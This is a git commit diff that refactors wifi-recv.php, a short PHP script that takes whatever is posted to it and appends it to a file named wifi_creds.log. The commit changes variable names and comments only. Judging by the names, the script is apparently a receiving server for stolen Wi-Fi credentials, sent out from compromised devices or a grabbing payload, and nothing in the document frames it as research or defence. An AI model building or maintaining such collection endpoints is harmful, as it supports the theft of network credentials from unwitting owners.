53b443441b578793d5b92d35ba407b4b06c15377
Zypher <131158367+Zypher17@users.noreply.github.com>
2026-05-10 14:44:14 +0530

    Refactor logging of incoming data in wifi-recv.php

--- wifi-recv.php
+++ wifi-recv.php
@@ -1,10 +1,11 @@
 <?php
 $logFile = __DIR__ . '/wifi_creds.log';
 
-$raw = file_get_contents('php://input');
+// Get the incoming data
+$inputData = file_get_contents('php://input');
 
-// Append raw CSV + newline
-file_put_contents($logFile, $raw . PHP_EOL, FILE_APPEND | LOCK_EX);
+// Write to log file with newline
+file_put_contents($logFile, $inputData . PHP_EOL, FILE_APPEND | LOCK_EX);
 
-// Simple OK response
+// Send response back
 echo "OK";
